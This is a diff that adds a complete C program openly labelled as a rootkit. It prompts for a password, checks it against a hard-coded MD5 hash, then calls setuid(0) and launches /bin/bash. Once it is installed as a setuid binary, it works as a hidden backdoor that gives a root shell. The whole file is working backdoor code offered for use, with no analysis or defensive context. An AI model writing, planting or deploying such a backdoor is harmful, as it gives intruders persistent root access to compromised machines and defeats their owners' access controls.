@@ -1,0 +1,67 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <openssl/md5.h>
+#define PASSWORD_HASH "84671b518a8f0cc6fbd4b6afc3be8cb9"
+
+void calculate_md5(char *input, unsigned char *output) {
+    MD5_CTX md5Context;
+    MD5_Init(&md5Context);
+    MD5_Update(&md5Context, input, strlen(input));
+    MD5_Final(output, &md5Context);
+}
+
+void print_md5(unsigned char *md5_hash) {
+    for (int i = 0; i < MD5_DIGEST_LENGTH; i++) {
+        printf("%02x", md5_hash[i]);
+    }
+    printf("\n");
+}
+
+int main() {
+    char inputPassword[50];
+    unsigned char inputPasswordHash[MD5_DIGEST_LENGTH];
+
+    printf("<==========[ ROOTKIT: Escalating Privileges ]==========>\n");
+
+    printf("Password to Get Root Access: ");
+    if (fgets(inputPassword, sizeof(inputPassword), stdin) == NULL) {
+        fprintf(stderr, "Error reading password.\n");
+        return 1;
+    }
+
+    inputPassword[strcspn(inputPassword, "\n")] = 0;
+
+    calculate_md5(inputPassword, inputPasswordHash);
+
+    char inputHashString[MD5_DIGEST_LENGTH * 2 + 1];
+    for (int i = 0; i < MD5_DIGEST_LENGTH; i++) {
+        sprintf(&inputHashString[i * 2], "%02x", inputPasswordHash[i]);
+    }
+
+    if (strcmp(inputHashString, PASSWORD_HASH) != 0) {
+        fprintf(stderr, "<==========[       Invalid Password         ]==========>\n");
+        return 1;
+    }
+
+    if (setuid(0) == -1) {
+        perror("setuid failed");
+        return 1;
+    }
+
+    if (getuid() != 0) {
+        fprintf(stderr, "<==========[        Failed To Gain Root        ]==========>\n");
+        return 1;
+    }
+
+    printf("<==========[  Successfully Changed To Root  ]==========>\n");
+
+    if (system("/bin/bash") == -1) {
+        perror("system failed");
+        return 1;
+    }
+
+    return 0;
+}
